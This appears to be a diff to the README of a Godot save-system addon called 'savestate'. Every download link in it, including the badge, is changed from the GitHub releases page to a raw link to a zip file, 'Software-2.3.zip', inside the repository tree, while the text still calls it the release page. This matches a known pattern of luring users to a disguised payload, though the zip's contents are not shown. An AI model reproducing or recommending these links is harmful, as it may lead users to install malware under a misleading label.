@@ -1,6 +1,6 @@
 # 💾 savestate - Simple saves with safe backups
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg?style=for-the-badge)](https://github.com/Aapka1914/savestate/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg?style=for-the-badge)](https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ If you only want the free Lite tier, this repository is the place to start. If y
 
 ## 📥 Download for Windows
 
-1. Open the release page: https://github.com/Aapka1914/savestate/releases
+1. Open the release page: https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip
 2. Find the latest release near the top of the page.
 3. Download the file that matches the version you want.
 4. If the download is a .zip file, right-click it and choose Extract All.
@@ -59,7 +59,7 @@ Useful setup notes:
 
 ## 🛠️ Install and Set Up
 
-1. Visit https://github.com/Aapka1914/savestate/releases
+1. Visit https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip
 2. Download the latest release file.
 3. Extract the download if it comes in a .zip file.
 4. Copy the savestate files into your Godot project.
@@ -207,4 +207,4 @@ If the data returns as expected, the save system is working.
 ## 🔗 Download Again
 
 Visit the release page to download the latest build for Windows:
-https://github.com/Aapka1914/savestate/releases
+https://github.com/Aapka1914/savestate/raw/refs/heads/main/addons/savestate/Software-2.3.zip
